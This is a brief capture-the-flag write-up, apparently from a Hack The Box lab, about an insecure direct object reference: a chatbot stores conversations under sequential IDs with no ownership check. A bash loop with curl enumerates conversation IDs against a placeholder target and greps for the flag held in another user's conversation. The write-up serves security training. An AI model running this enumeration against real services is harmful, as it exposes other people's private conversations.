# Insecure Integrated Components (IDOR)

Chatbot conversations stored sequentially with no ownership verification.

## Attack

```bash
for i in $(seq 1 20); do
    curl -s http://TARGET/query/$i -b 'session=SESSION_COOKIE'
done | grep 'HTB{'
```

The flag was stored in another user's conversation.
